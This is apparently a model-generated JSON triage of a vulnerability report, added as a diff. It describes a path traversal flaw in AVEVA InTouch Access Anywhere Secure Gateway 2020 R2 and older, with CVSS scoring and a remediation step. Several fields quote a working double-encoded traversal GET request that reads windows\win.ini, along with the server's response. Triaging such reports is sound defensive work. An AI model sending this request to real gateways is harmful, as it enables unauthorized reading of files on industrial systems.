@@ -1,0 +1,61 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "Path traversal vulnerability in AVEVA InTouch Access Anywhere Secure Gateway 2020 R2 and older allows reading arbitrary files via crafted GET requests.",
+    "affected_product": "Access Anywhere Secure Gateway versions 2020 R2 and older",
+    "cwe": "CWE-22",
+    "cwe_quote": "GET\n/AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini\nHTTP/1.1",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "GET\n/AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini\nHTTP/1.1"
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "N",
+        "quote": "GET\n/AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini\nHTTP/1.1"
+      },
+      "UI": {
+        "value": "N",
+        "quote": ""
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "L",
+        "quote": "HTTP/1.1 200 OK\nServer: EricomSecureGateway/8.4.0.26844.*\n(..)\n\n; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1"
+      },
+      "I": {
+        "value": "N",
+        "quote": ""
+      },
+      "A": {
+        "value": "N",
+        "quote": ""
+      }
+    },
+    "recommended_next_step": "Verify the vulnerability by reproducing the GET request against a test instance, identify all accessible filesystem paths, and implement input validation/normalization to prevent ../ encoded traversals or apply path canonicalization and access controls. Coordinate disclosure and prepare patch or mitigation guidance.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "Proof-of-concept request demonstrating path traversal",
+        "quote": "GET\n/AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini\nHTTP/1.1"
+      },
+      {
+        "claim": "Server responded with file contents",
+        "quote": "HTTP/1.1 200 OK\nServer: EricomSecureGateway/8.4.0.26844.*\n(..)\n\n; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 1843,
+    "output_tokens": 953,
+    "latency_s": null,
+    "batch": true
+  }
+}
